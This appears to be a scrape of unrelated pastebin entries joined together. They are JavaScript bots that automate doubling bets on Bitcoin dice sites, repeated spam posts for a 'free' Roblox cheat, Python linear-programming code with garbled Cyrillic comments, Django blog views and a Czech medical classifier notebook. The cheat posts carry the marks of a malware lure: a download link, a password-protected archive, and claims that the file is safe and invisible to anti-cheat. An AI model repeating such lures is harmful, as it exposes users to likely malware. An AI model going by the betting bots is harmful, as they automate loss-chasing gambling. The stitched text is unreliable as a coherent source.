var sevens = (prefit*6.9);
var eights = (prefit*7.9);
var fives = (prefit*4.9);
var fours = (prefit*4);
var winnerdinner = (elderly*24);
var snowzy = ((Math.floor(elderly/tens))*tens);
var snowie = 0;
var great = elderly;
var snot = elderly;
var nomnom = true;
var myseed = goodgoing;
 
 function getR(minz, maxz) {
  minz = Math.ceil(minz);
  maxz = Math.floor(maxz);
  return Math.floor(Math.random() * (maxz - minz + 1)) + minz;
}
 
function makeid(length) {
    var result = '';
    var cha = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var chaLength = cha.length;
    for ( var ion = 0; ion < length; ion++ ){
      result += cha.charAt(Math.floor(Math.random() *
 chaLength));
   }
   return result;
} 


function go(){
great = document.getElementById('balance').innerHTML;
var dog = Number((great-elderly).toFixed(8));
console.log(""profit"");
console.log(dog);
if (((great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))&&(great<(snowie-crust)))||((great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))&&(great>(snowie+crust)))){
    beast = beast*2;
    snowie = parseFloat(great);
}
if ((great<=(snot-tens))&&(great<(((Math.floor(great/tens))*tens)+fives))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    fart = 0;
    snowie = 0;
    snot = parseFloat(great);
    snowzy = ((Math.floor(great/tens))*tens);
}
if (great>snot){
    snot = parseFloat(great);
    }
if ((beast>fours)&&(great>=snot)&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    snowie = 0;
    snot = parseFloat(great);
    snowzy = ((Math.floor(great/tens))*tens);
}
if ((great>=(snowzy+(tens*3)))&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    snowie = 0;
    snot = parseFloat(great);
    snowzy = ((Math.floor(great/tens))*tens);
}
if (great>=winnerdinner){
console.log(""winner winner chicken dinner"");
return;
}
var xol = getR(1,3);
if (xol==1) {
myseed = (makeid(5));
}
if (xol==2) {
myseed = (makeid(7));
}
if (xol==3) {
myseed = (makeid(9));
}
document.getElementById('next_client_seed').value = myseed;
document.getElementById('double_your_btc_win_chance').value = 47.50
parseFloat(document.getElementById('double_your_btc_stake').value = ((beast*1).toFixed(8)));
parseFloat(document.getElementById('win_amount').innerHTML = ((beast*1).toFixed(8)));
document.getElementById('double_your_btc_bet_lo_button').click();
setTimeout(() => go(), 1000);
}
go();"
sF0e5myA,Roblox AURORAX,jordanthebordan,C++,Sunday 26th of May 2024 06:14:38 PM CDT,"Download - https://youtu.be/nDD-zK_gGXQ

Note
Roblox AURORA X cheat is designed specifically to give players the ability to fully control the gameplay and enjoy the game without limitations. We offer an extensive set of features that can be activated and customized according to each player's preferences. Just recently we decided to make our cheat free and available to all players without exception. Thanks to our 24/7 support, we fix your problems on time and keep our cheat on top.
 
Download - https://youtu.be/nDD-zK_gGXQ
 
Features üõ†Ô∏è:
ESP (Wallhack) - this feature of our cheat will allow you to see behind walls! You will be able to see players' names, their health, exact distance to them, the contents of crates, various lines (such as sight lines), team affiliation and much more!
AIMBOT (Aim Target) - we have implemented the best aimbot (automatic aiming) with lots of customization options. This allows each of your shots to be the last for your opponent. You can choose the target - it can be a specific body part or just precise aiming.
Misc (Tools) - our cheat also has a number of useful tools. For example, there is a function that removes weapon recoil and makes it reload faster. It is also possible to reduce ping, increase FPS by removing unnecessary objects in the scene. There are other useful features.
 
Download - https://youtu.be/nDD-zK_gGXQ
 
Tip
1. Anti-cheats (VAC, FACEIT, ESEA, BATTLEYE, EAC and many others) cannot detect our cheat.
2. Most importantly: the program is completely safe for your Windows system.
3. Support for most systems: Windows 7/8/8.1/10/11 (x32/64)
4. Password Archive - 1234
 
 
Download - https://youtu.be/nDD-zK_gGXQ"
Cg1QdTXp,CreateW,Oppaceted,Python,Sunday 26th of May 2024 06:07:22 PM CDT,"def CreateW(A: list, B: list, column: list, headers: list) -> list:
    W = [0]*(len(A[0])+1)      
    for i in range(len(A)):
        if column[i][0] == 'y':
            for j in range(len(A[0])):
                W[j] += A[i][j]
            W[len(A[0])] += B[i]
    for j in range( len( A[0] ) ):
        if headers[j][0] == 'y':
            W[j] += 1
    return W
def ChangeFunctional(column: list, Functional_koeff: list) -> list:
    new_Functional = list(Functional_koeff)
    for i in range(len(column)):
        new_Functional[i] = Functional_koeff[int(column[i][2])-1]
    return new_Functional
def CreateF(A: list, B: list, Functional_koeff: list) -> list:
    F = [0]*(len(A[0])+1)
    for i in range(len(A)):
        for j in range(len(A[0])):
            F[j] += Functional_koeff[i]*A[i][j]
    for i in range(len(A)):
        F[len(F)-1] += B[i]*Functional_koeff[i]
    return F

def ChangeF(A: list, B: list, F: list, stroka_number: int, stolbec_number: int):
    F[len(F)-1] += B[stroka_number]*F[stolbec_number]
    for j in range(len(A[0])):
        for i in range(len(A)):    
            pass
        if j == stolbec_number:
            print(f'A: {A[stroka_number][stolbec_number]}')
            print(f'F[j]: {F[j]}')
            F[j] *= A[stroka_number][stolbec_number]
        else:
            F[j] += F[stolbec_number]*A[stroka_number][j]
    return F"
fA8fyFdB,drawing,Oppaceted,Python,Sunday 26th of May 2024 06:06:34 PM CDT,"from tabulate import tabulate
from CreateW import CreateW

def ShowFunctional(N: int, Functional_koeff: list) -> None:
    for i in range(N):
        print(f""{Functional_koeff[i]}x_{i+1}"", end= """")
        if i == N-1:    #–≤ range —Å–æ–∑–¥–∞–µ—Ç—Å—è N-1 —ç–ª–µ–º–µ–Ω—Ç–æ–≤ (–Ω–∞—á–∏–Ω–∞–µ–º —Å –Ω—É–ª—è) => –±–µ—Ä–µ–º i == N-1
            print()
        else:
            print(""+"", end = """")
def ShowMatrixElement (A: list, i: int, j: int) -> None:
    for el_i in range(len(A)):
        print (""("", end="" "")
        for el_j in range(len(A[i])):
            print( ""   X"" if (el_i == i and el_j == j) else f""{A[el_i][el_j]:>4}"" , end="" "")
        print ("")"")
def ShowTable(A: list, B: list,  column: list, input_headers: list, input_W: list) -> None:
    M = len(A)
    N = len(A[0])
    headers = [''] + input_headers + ['B']
    data = []
    for i in range(M):
        #data.append([f'y_{i+1}'])
        data.append([column[i]])
        data[i] = data[i] + [i for i in A[i]] + [B[i]]
    data += [['W'] + input_W]
    #data += [['W'] + CreateW(A, B, column, input_headers)]
    print( tabulate(tabular_data= data, headers=headers, tablefmt=""grid"") )"
1FiTNy6S,reduction_to_canonical_form,Oppaceted,Python,Sunday 26th of May 2024 06:05:53 PM CDT,"#reduction_to_canonical_form
from drawing import ShowMatrixElement, ShowTable
from CreateW import CreateW, ChangeF

def SetToCanon (A: int, N: int, M: int, more: bool) -> None:
    for i in range(M):
        for j in range(M):
            if j == i:
                A[i].append( (more-0.5000)*(-2) )
            else:
                A[i].append(0)
    ShowMatrixElement(A, -1, -1)

def ChooseVariables(A: list, B: list, W: list) -> (int, int):
    M = len(A) # –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —É—Ä–∞–≤–Ω–µ–Ω–∏–π/—Å—Ç—Ä–æ–∫
    N = len(A[0]) # –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö/—Å—Ç–æ–ª–±—Ü–æ–≤
    #print(W) #–æ—Ç–ª–∞–¥–∫–∞
    stolbec_number = 0
    for i in range( len(W) ):
        if W[i] < W[stolbec_number]:
            stolbec_number = i
    print(W[stolbec_number])#–æ—Ç–ª–∞–¥–∫–∞    
    for i in range(len(A)):
        stroka_number = i
        if A[i][stolbec_number] != 0:
            break
    indicator = 3**10
    for i in range( len(A) ):
        if not B[i]*A[i][stolbec_number]<0:
            continue
        #if abs( B[i]/A[i][stolbec_number] ) < abs(B[stroka_number]/A[stroka_number][stolbec_number]) :
        if abs( B[i]/A[i][stolbec_number] ) < indicator :
            indicator = abs( B[i]/A[i][stolbec_number] )
            stroka_number = i
    print(A[stroka_number][stolbec_number])#–æ—Ç–ª–∞–¥–∫–∞
    return (stroka_number, stolbec_number)

def ChangeVariables(A: list, B: list, stroka_number: int, stolbec_number: int, column: list, headers: list, W_or_F: bool, F = None):
    B[stroka_number] = B[stroka_number]/A[ stroka_number ][ stolbec_number ]*-1
    for j in range( len(A[0]) ):
        if (j != stolbec_number):
            A[ stroka_number ][j] = A[ stroka_number ][j]/A[ stroka_number ][ stolbec_number ]*-1
    A[stroka_number][stolbec_number] = 1/A[ stroka_number ][ stolbec_number ]
    
    for i in range(len(A)):
        if i == stroka_number:
            continue
        else:
            B[i] += B[stroka_number]*A[i][stolbec_number]
            for j in range(len(A[0])):
                if j != stolbec_number:
                    A[i][j] += A[i][stolbec_number] * A[stroka_number][j]
                #A[i][stolbec_number] *= A[stroka_number][stolbec_number]
            A[i][stolbec_number] *= A[stroka_number][stolbec_number]    
            
    

    column[stroka_number], headers[stolbec_number] = headers[stolbec_number], column[stroka_number]
    #ShowTable(A, B, column, headers, CreateW(A, B, column, headers))
    if not W_or_F:
        F = ChangeF( A, B, F, ChooseVariables(A, B, F)[0], ChooseVariables(A, B, F)[1])
    ShowTable(A, B, column, headers, (CreateW(A, B, column, headers) if W_or_F==True else F ) )

def RemoveExtraVars(A: list, B:list, N: int, column: list, headers: list) -> (list, list, list, list):
    new_A = A.copy()
    new_B = B.copy()
    new_column = column.copy()
    for i in range(len(A)):
        if int(column[i][2]) > N:
            new_A.remove(A[i])
            new_B.remove(B[i])
            new_column.remove(column[i])
    column = new_column.copy()
    B = new_B.copy()

    new_headers = headers.copy()
    new_A = Transpose(new_A)
    A = new_A.copy()
    for j in range(len(A)):
        if headers[j][0] == 'y':
            new_A.remove(A[j])
            new_headers.remove(headers[j])
    A = Transpose(new_A).copy()
    headers = new_headers.copy()
    return (A, B, column, headers)
    #
    '''
    A = [[A[j][i] for j in range(len(A))] for i in range(len(A[0]))]
    new_A = A.copy()
    new_headers = headers.copy()
    for j in range(len(A)):
        if headers[j][0] == 'y':
            new_A.remove(A[i])
            new_headers.remove(headers[i])
    A = new_A.copy()
    A = [[A[j][i] for j in range(len(A))] for i in range(len(A[0]))]
    headers = new_headers.copy()
    '''
    '''
    for i in :
        if int(i[2]) > N:
            A.pop(column.index(i))
            B.pop(column.index(i))
            column.remove(i)
            '''
'''
    for l in A: #–∏–Ω–æ–≥–¥–∞ —Å—Ç–æ–ª–±—Ü—ã –Ω–µ —É–¥–∞–ª—è—é—Ç—Å—è, –ø–æ—ç—Ç–æ–º—É –Ω—É–∂–Ω–æ –ø—Ä–æ–π—Ç–∏ –µ—â—ë —Ä–∞–∑
        for j in headers:
            if j[0] == 'y':
                for i in A:
                    i.pop(headers.index(j))
                headers.remove(j)
                '''
def Transpose(A: list):
    A = [[A[j][i] for j in range(len(A))] for i in range(len(A[0]))]
    return A
def CheckCondition(F: list) -> bool:
    for i in range(len(F)-1):
        if F[i]<0:
            return True
    return False"
v5Fsvj2K,main,Oppaceted,Python,Sunday 26th of May 2024 06:04:03 PM CDT,"from drawing import *
from reduction_to_canonical_form import *
from CreateW import *
from os import system

N = int(input(""–í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö: ""))
M = int(input(""–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —É—Ä–∞–≤–Ω–µ–Ω–∏—è: ""))
Functional_koeff = []
for i in range(N):
    Functional_koeff.append(float(input(f""L_{i+1}: "") ) )
print(""f = "", end= """")
ShowFunctional(N, Functional_koeff)
B = [] #–≤–µ–∫—Ç–æ—Ä
A = [] #–º–∞—Ç—Ä–∏—Ü–∞

for i in range(M):
    A.append([])
    for j in range(N):
        A[i].append(""*"")

for i in range(M):
    for j in range(N):
        system(""cls"")
        ShowMatrixElement(A, i, j)
        A[i][j]=(float(input(f""A_{i+1,j+1}="")))
system(""cls"")
ShowMatrixElement(A, -1, -1)
input()
system(""cls"")
for i in range(M):
    B.append(float(input(f""B_{i+1}="")))


print(A)#–æ—Ç–ª–∞–¥–∫–∞
print(B)#–æ—Ç–ª–∞–¥–∫–∞
input()
while(True): 
    system(""cls"")
    enter = input('–û–ø—Ä–µ–¥–µ–ª–∏—Ç–µ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ: ')
    if(enter ==  ""–ë–æ–ª—å—à–µ""):
        more = True
        break
    elif(enter ==  ""–ú–µ–Ω—å—à–µ""):
        more = False
        break
    #more = True if enter == ""–ë–æ–ª—å—à–µ"" else False if enter == ""–ú–µ–Ω—å—à–µ"" else exit(0)
    #–≠—Ç–æ —Ç–µ—Ä–Ω–∞—Ä–Ω—ã–π –æ–ø–µ—Ä–∞—Ç–æ—Ä. –û–Ω –Ω—É–∂–µ–Ω, —á—Ç–æ–±—ã –ø–∏—Å–∞—Ç—å –≤ –æ–¥–Ω—É —Å—Ç—Ä—á–æ–∫—É –≤–º–µ—Å—Ç–æ –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö

for i in range(M):
    for j in range(N):
        print(f""{A[i][j]}x_{j+1}"", end = "" "")
        print(end=( (f""\u2265 {B[i]}\n"" if more else f""\u2264 {B[i]}\n"" ) if (j == N-1) else ""+ "" ) )
print(""F = "", end ="""");ShowFunctional(N, Functional_koeff)

SetToCanon(A, N, M, more)
input()
system(""cls"")

for i in range(M):
    for j in range( len( A[0] ) ):
        print(f""{A[i][j]}x_{j+1}"", end = "" "")
        if j != ( len(A[0])-1 ):
            print(end="" +  "")
    print(f""={B[i]}"", end=""\n\n"")

for i in range(M):
    for j in range( len( A[0] ) ):
        A[i][j] = A[i][j]*-1

headers = []        
for j in range(len(A[0])):
    headers.append(f'x_{j+1}')
column = []        
for i in range(len(A)):
    column.append(f'y_{i+1}')

#W = []
#ShowTable(A, B, W, column, headers)
input_W = CreateW(A, B, column, headers)    
ShowTable(A, B, column, headers, input_W)
for i in range(M):
    u=ChooseVariables(A, B, CreateW(A, B, column, headers))
    #print(headers[u[1]])#–æ—Ç–ª–∞–¥–∫–∞
    ChangeVariables(A, B, u[0], u[1], column, headers, True)
   
G = RemoveExtraVars(A, B, N, column, headers)
A = G[0]
B = G[1]
column = G[2]
headers = G[3]

Functional_koeff = ChangeFunctional(column, Functional_koeff)

input_F = CreateF(A, B, Functional_koeff)
ShowTable(A, B, column, headers, input_F)

count = 0
while(CheckCondition(input_F) and count <= 20):
    count += 1
    u = ChooseVariables(A, B, input_F)
    ChangeVariables(A, B, u[0], u[1], column, headers, False, input_F)
"
G57JK4sf,Untitled,rlc4,Python,Sunday 26th of May 2024 05:43:57 PM CDT,"import datetime
from django.shortcuts import render, get_object_or_404, get_list_or_404
from blog.models import Post, Category, Location
from django.db.models import Q


def index(request):
    template_name = 'blog/index.html'
    current_time = datetime.datetime.now()
    post_list = get_list_or_404(
        Post,
        is_published=True,
        pub_date__lt=current_time,
        category__is_published=True
    )[:5]

    context = {
        'post_list': post_list
    }

    return render(request, template_name, context)


def category_posts(request, category_slug):
    template_name = 'blog/category.html'
    current_time = datetime.datetime.now()
    category = get_object_or_404(
        Category,
        slug=category_slug,
        is_published=True
    )

    post_list = get_list_or_404(
        Post,
        is_published=True, 
        category=category,
        pub_date__lte=current_time,
        category__is_published=True
    )

    context = {
        'category': category,
        'post_list': post_list
    }

    return render(request, template_name, context)


def post_detail(request, post_id):
    template_name = 'blog/detail.html'
    current_time = datetime.datetime.now()

    post = get_object_or_404(
        Post,
        pk=post_id,
        pub_date__lte=current_time,
        is_published=True,
        category__is_published=True
    )

    context = {
        'post': post
    }

    return render(request, template_name, context)"
Wj2mnHsm,Roblox Free Executor,jordanthebordan,C++,Sunday 26th of May 2024 05:34:53 PM CDT,"Download and Instruction - https://youtu.be/nDD-zK_gGXQ

Note
Roblox AURORA X cheat is designed specifically to give players the ability to fully control the gameplay and enjoy the game without limitations. We offer an extensive set of features that can be activated and customized according to each player's preferences. Just recently we decided to make our cheat free and available to all players without exception. Thanks to our 24/7 support, we fix your problems on time and keep our cheat on top.
 
Download and Instruction - https://youtu.be/nDD-zK_gGXQ
 
Features üõ†Ô∏è:
ESP (Wallhack) - this feature of our cheat will allow you to see behind walls! You will be able to see players' names, their health, exact distance to them, the contents of crates, various lines (such as sight lines), team affiliation and much more!
AIMBOT (Aim Target) - we have implemented the best aimbot (automatic aiming) with lots of customization options. This allows each of your shots to be the last for your opponent. You can choose the target - it can be a specific body part or just precise aiming.
Misc (Tools) - our cheat also has a number of useful tools. For example, there is a function that removes weapon recoil and makes it reload faster. It is also possible to reduce ping, increase FPS by removing unnecessary objects in the scene. There are other useful features.
 
Download and Instruction - https://youtu.be/nDD-zK_gGXQ
 
Tip
1. Anti-cheats (VAC, FACEIT, ESEA, BATTLEYE, EAC and many others) cannot detect our cheat.
2. Most importantly: the program is completely safe for your Windows system.
3. Support for most systems: Windows 7/8/8.1/10/11 (x32/64)
4. Password Archive - 1234
 
 
Download and Instruction - https://youtu.be/nDD-zK_gGXQ"
48TPT3HY,Roblox Executor,jordanthebordan,C++,Sunday 26th of May 2024 05:33:37 PM CDT,"Note
Roblox AURORA X cheat is designed specifically to give players the ability to fully control the gameplay and enjoy the game without limitations. We offer an extensive set of features that can be activated and customized according to each player's preferences. Just recently we decided to make our cheat free and available to all players without exception. Thanks to our 24/7 support, we fix your problems on time and keep our cheat on top.
 
Download - https://youtu.be/nDD-zK_gGXQ
 
Features üõ†Ô∏è:
ESP (Wallhack) - this feature of our cheat will allow you to see behind walls! You will be able to see players' names, their health, exact distance to them, the contents of crates, various lines (such as sight lines), team affiliation and much more!
AIMBOT (Aim Target) - we have implemented the best aimbot (automatic aiming) with lots of customization options. This allows each of your shots to be the last for your opponent. You can choose the target - it can be a specific body part or just precise aiming.
Misc (Tools) - our cheat also has a number of useful tools. For example, there is a function that removes weapon recoil and makes it reload faster. It is also possible to reduce ping, increase FPS by removing unnecessary objects in the scene. There are other useful features.
 
Download - https://youtu.be/nDD-zK_gGXQ
 
Tip
1. Anti-cheats (VAC, FACEIT, ESEA, BATTLEYE, EAC and many others) cannot detect our cheat.
2. Most importantly: the program is completely safe for your Windows system.
3. Support for most systems: Windows 7/8/8.1/10/11 (x32/64)
4. Password Archive - 1234
 
 
Download - https://youtu.be/nDD-zK_gGXQ
"
PXAzp90v,snowybot,coinwalk,JavaScript,Sunday 26th of May 2024 05:14:18 PM CDT,"var elderly = parseFloat(document.getElementById('pct_balance').value);
var prefit = 0.0001;
var beast = prefit;
var crust = (prefit/2)
var tens = (prefit*10);
var sevens = (prefit*6.9);
var eights = (prefit*7.9);
var fives = (prefit*4.9);
var fours = (prefit*4);
var winnerdinner = 144000;
var snowzy = ((Math.floor(elderly/tens))*tens);
var snowie = 0;
var great = elderly;
var snot = elderly;
var nomnom = true;
 
function go(){
great = document.getElementById('pct_balance').value;
var dog = Number((great-elderly).toFixed(8));
console.log(""profit"");
console.log(dog);
if (((great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))&&(great<(snowie-crust)))||((great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))&&(great>(snowie+crust)))){
    beast = beast*2;
    snowie = parseFloat(great);
}
if ((great<=(snot-tens))&&(great<(((Math.floor(great/tens))*tens)+fives))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    fart = 0;
    snowie = 0;
    snot = parseFloat(great);
    snowzy = ((Math.floor(great/tens))*tens);
}
if (great>snot){
    snot = parseFloat(great);
    }
if ((beast>fours)&&(great>=snot)&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    snowie = 0;
    snot = parseFloat(great);
    snowzy = ((Math.floor(great/tens))*tens);
}
if ((great>=(snowzy+(tens*3)))&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    snowie = 0;
    snot = parseFloat(great);
    snowzy = ((Math.floor(great/tens))*tens);
}
if (great>=winnerdinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((beast*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 1000);
}
go();"
TEknrxUi,ok posledni VK,max2201111,Python,Sunday 26th of May 2024 04:49:10 PM CDT,"#Navod na pouziti, Mgr. Hynek Mlƒçou≈°ek, v Brne 2.5.2024
#Ulozte do lokalniho souboru u sebe na PC data tohoto tvaru vzdy ukoncene 0 ci 1 (jde o uceni s ucitelem: 1 = nemocny, 0 = prezil/zdravy, ve vystupu bude zelena znacit 0, cervena 1)  a bez znaku #; pozor na "",""

# [ [23.657800719276743,18.859916797201468,0],
# [22.573729142097473,17.96922325097786,0],
# [32.55342396968757,29.463651408558803,0],
# [6.718035041529263,25.704665468161718,1],
# [14.401918566243225,16.770856492924658,0],
# [17.457907312962234,21.76521470574044,0],
# [20.02796946568093,73.45445954770891,1],
# [30.295138369778076,62.901112886193246,1],
# [15.128977804449633,32.40267702110393,0],
# [30.179457395820013,58.982492125646104,1],
# [28.01649701854089,63.92781357637711,1],
# [16.791838457871147,42.33482314089884,0],
# [10.583694293380976,19.61926728942497,0],
# [26.634447074406467,91.96624817360987,1],
# [26.217868623367643,36.400293587062976,0],
# [17.689396788624936,60.79797114006423,1],
# [33.17193822527976,66.75277364959176,1],
# [23.793952755709153,22.57501437360518,0]]

#kliknete na cerne tlacitko s trojuhelnickem vlevo nahore
#pod kodem se objevi moznost spustit dialogove okenko, kliknete na nej
#soubor, ktery mate z bodu vyse vyberte a nahrajte
#Najdete v tomto kodu retezec:
###ZDE VLOZTE DATA OD NOVYCH PACIENTU

#Vlozte do pole
# new_persons_results = []
# data o nekolika malo novych pacientech bez ukoncovaci 0 a 1, ale se stejnym poctem sloupcu jako ma soubor z Vaseho lokalniho disku, vyse by tedy toto bylo rovno 2
#kod vyhodi hned po natrenovani, (jehoz prubeh muzete sledovat na modre progres bare) pro kazdy radek z new_persons_results bilo-sedo-cerne ctverecky vznikle z normalizace poskytnutych dat a ukoncovaci ctverecek cerveny pripadne zeleny
#zaroven s tim se vypise realne cislo mezi 0 a 1 znacici jak moc je pacient zdravy (blizke 0) ci nemocny (blizke 1)
#cisla uprostred pak indikuji zadany oranzovy semafor.
#je na lekarich nastavit tresholdy (tedy pravdepodobnosti: cisla mezi 0 a 1) ktere pak daji zaver, zda je pacient cerveny, oranzovy ci zeleny

# prosim o komnetare a vysledky na realnych datech, je zadouci aby radku v matici, tedy pacientu byly stovky a sloupcu desitky
# Moznosti vyuziti: onkologicka diagnoza vs. zdrava kontorlni skupina, diabetes (pritomnost/nepritomnost), testovani noveho leku oproti placebu atd.

#kod zaroven vyhodi confusion matici, tedy mozne True Negative a False Positive plus spravne zarazene hodnoty spolu s presnosti,F1 score recall atd.
#poznamka ke kodu: jde o epxerimentalni verzi, ktera krome skutecne potrebneho kodu obsahuje ladici informace, ruzne duplicity, nadbytecne prikazy atd.
# Na uvod behu programu se pro kontorlu vypise poskytnuta matice a jeji normalizovana verze, je treba sjet jezdcem napravo nize na obrazky a dalsi vystupy

#Dekuji profesoru Petru Dostalovi za namet k teto praci a poskytnuta data, byt je potreba mit data realna

import numpy as np
import matplotlib.pyplot as plt
import tensorflow as tf
from tqdm import tqdm


from IPython.display import display
from IPython.display import Javascript
display(Javascript('IPython.OutputArea.auto_scroll_threshold = 9999;'))

label_colors = {0: [0, 128, 0], 1: [255, 0, 0]}
label_colors_testing = {0: [0, 128, 0], 1: [255, 0, 0]}


%matplotlib inline



# Function to create images based on predictions
def create_image(data, predictions):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Create a gradient based on the normalized values
        gradient_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
        image[i, -1] = np.array([gradient_value] * 3)

    return image

def create_image(data, predictions):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use red for class 0 and green for class 1
        if predictions[i] == 0:
            image[i, -1] = np.array([255, 0, 0])  # Red
        elif predictions[i] == 1:
            image[i, -1] = np.array([0, 128, 0])  # Green

    return image

def create_image(data, predictions, label_colors):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        image[i, -1] = label_colors[predictions[i]]

    return image

# def create_imageN(data, predictions, label_colors=None):
#     num_rows, num_columns = len(data), len(data[0])
#     image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

#     for i in range(num_rows):
#         for j in range(num_columns):
#             # Map data values to the full range of 0 to 255
#             pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
#             image[i, j] = np.array([pixel_value] * 3)

#         # Use the specified color for the last column based on the label
#         if label_colors is not None:
#             image[i, -1] = label_colors[predictions[i]]
#         else:
#             # If label_colors is not provided, set the last column to grayscale
#             pixel_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
#             image[i, -1] = np.array([pixel_value] * 3)

#     return image

# def create_imageN(data, predictions, label_colors=None):
#     num_rows, num_columns = len(data), len(data[0])
#     image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

#     for i in range(num_rows):
#         for j in range(num_columns):
#             # Map data values to the full range of 0 to 255
#             pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
#             image[i, j] = np.array([pixel_value] * 3)

#         # Use the specified color for the last column based on the label
#         if label_colors is not None:
#             image[i, -1] = label_colors[predictions[i]]
#         else:
#             # If label_colors is not provided, set the last column to grayscale
#             pixel_value = int(np.interp(predictions[i], [np.min(data), np.max(data)], [0, 255]))
#             image[i, -1] = np.array([pixel_value] * 3)

#     return image

# def create_imageN(data, predictions, label_colors=None):
#     num_rows, num_columns = len(data), len(data[0])
#     image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

#     for i in range(num_rows):
#         for j in range(num_columns - 1):  # Exclude the last column for now
#             # Map data values to the full range of 0 to 255
#             pixel_value = int(np.interp(data[i][j], [np.min(data[:, j]), np.max(data[:, j])], [0, 255]))
#             image[i, j] = np.array([pixel_value] * 3)

#         # Use the specified color for the last column based on the label
#         if label_colors is not None:
#             image[i, -1] = label_colors[predictions[i]]
#         else:
#             # If label_colors is not provided, set the last column to grayscale
#             pixel_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
#             image[i, -1] = np.array([pixel_value] * 3)

#     return image


# def create_imageN(data, predictions, label_colors=None):
#     num_rows, num_columns = len(data), len(data[0])
#     image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

#     data_array = np.array(data)  # Convert data to a NumPy array

#     for i in range(num_rows):
#         for j in range(num_columns - 1):  # Exclude the last column for now
#             # Map data values to the full range of 0 to 255
#             pixel_value = int(np.interp(data_array[i, j], [np.min(data_array[:, j]), np.max(data_array[:, j])], [0, 255]))
#             image[i, j] = np.array([pixel_value] * 3)

#         # Use the specified color for the last column based on the label
#         if label_colors is not None:
#             image[i, -1] = label_colors[predictions[i]]
#         else:
#             # If label_colors is not provided, set the last column to grayscale
#             pixel_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
#             image[i, -1] = np.array([pixel_value] * 3)

#     return image

# def create_imageN(data, predictions, label_colors=None):
#     num_rows, num_columns = len(data), len(data[0])
#     image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

#     data_array = np.array(data)  # Convert data to a NumPy array

#     for i in range(num_rows):
#         for j in range(num_columns - 1):  # Exclude the last column for now
#             # Map data values to the full range of 0 to 255
#             pixel_value = int(np.interp(data_array[i, j], [np.min(data_array[:, j]), np.max(data_array[:, j])], [0, 255]))
#             image[i, j] = np.array([pixel_value] * 3)

#         # Use the specified color for the last column based on the label
#         if label_colors is not None:
#             image[i, -1] = label_colors[predictions[i]]
#         else:
#             # If label_colors is not provided, set the last column to grayscale
#             pixel_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
#             image[i, -1] = np.array([pixel_value] * 3)

#     # Now, normalize the last column separately to achieve grayscale
#     min_pixel_value = np.min(image[:, -1])
#     max_pixel_value = np.max(image[:, -1])
#     for i in range(num_rows):
#         pixel_value = int(np.interp(image[i, -1], [min_pixel_value, max_pixel_value], [0, 255]))
#         image[i, -1] = np.array([pixel_value] * 3)

#     return image

# def create_imageN(data, predictions, label_colors=None):
#     num_rows, num_columns = len(data), len(data[0])
#     image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

#     for i in range(num_rows):
#         for j in range(num_columns):
#             # Map data values to the full range of 0 to 255
#             pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
#             image[i, j] = np.array([pixel_value] * 3)

#         # Now, normalize the last column separately to achieve grayscale


#         min_pixel_value = np.min(data[:, -1])
#         max_pixel_value = np.max(data[:, -1])
#         pixel_value = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))

#         # Use the specified color for the last column based on the label
#         if label_colors is not None:
#             image[i, -1] = label_colors[predictions[i]]

#     return image

# def create_imageN(data, predictions, label_colors=None):
#     num_rows, num_columns = len(data), len(data[0])
